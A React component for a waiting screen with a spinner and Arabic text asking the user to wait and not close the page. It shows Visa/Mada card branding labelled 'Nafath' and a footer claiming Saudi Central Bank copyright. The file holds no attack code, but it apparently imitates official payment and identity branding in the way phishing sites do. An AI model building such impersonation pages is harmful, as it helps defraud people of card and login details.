import { useLocation } from "wouter";
import { Header } from "@/components/layout/Header";
import { Loader2 } from "lucide-react";
import { motion } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function WaitingPage() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />

      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">

          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-8 object-contain" />

          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center"
          >
            <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
          </motion.div>

          <h2 className="text-xl font-bold text-gray-800 mb-4">
            جارٍ معالجة طلبك...
          </h2>

          <p className="text-gray-600 leading-relaxed">
            يرجى الانتظار
            <br />
            <span className="text-sm text-gray-400">لا تغلق هذه الصفحة</span>
          </p>

        </div>
      </div>

      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © البنك المركزي السعودي
      </footer>
    </div>
  );
}
